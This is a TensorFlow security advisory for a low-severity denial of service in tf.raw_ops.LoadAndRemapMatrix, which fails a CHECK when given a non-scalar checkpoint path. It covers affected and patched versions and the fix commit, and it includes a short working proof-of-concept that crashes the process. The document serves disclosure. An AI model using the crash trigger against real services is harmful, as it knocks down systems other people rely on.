# `CHECK`-fail in `LoadAndRemapMatrix`

Low

[mihaimaruseac](/mihaimaruseac)
published
GHSA-gvm4-h8j3-rjrq
May 13, 2021

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.5.0

## Patched versions

2.1.4, 2.2.3, 2.3.3, 2.4.2

## Description

### Impact

An attacker can cause a denial of service by exploiting a `CHECK`-failure coming from `tf.raw_ops.LoadAndRemapMatrix`:

```
import tensorflow as tf

ckpt_path = tf.constant([], shape=[0], dtype=tf.string)
old_tensor_name = tf.constant("")
row_remapping = tf.constant([], shape=[0], dtype=tf.int64)
col_remapping = tf.constant([1], shape=[1], dtype=tf.int64)
initializing_values = tf.constant(1.0)

tf.raw_ops.LoadAndRemapMatrix(
    ckpt_path=ckpt_path, old_tensor_name=old_tensor_name,
    row_remapping=row_remapping, col_remapping=col_remapping,
    initializing_values=initializing_values, num_rows=0, num_cols=1)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/d94227d43aa125ad8b54115c03cece54f6a1977b/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L219-L222) assumes that the `ckpt_path` is always a valid scalar.

```
const string& ckpt_path = ckpt_path_t->scalar<tstring>()();
```

However, an attacker can send any other tensor as the first argument of `LoadAndRemapMatrix`. This would cause the rank `CHECK` in `scalar<T>()()` to trigger and terminate the process.

### Patches

We have patched the issue in GitHub commit [77dd114513d7796e1e2b8aece214a380af26fbf4](https://github.com/tensorflow/tensorflow/commit/77dd114513d7796e1e2b8aece214a380af26fbf4).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
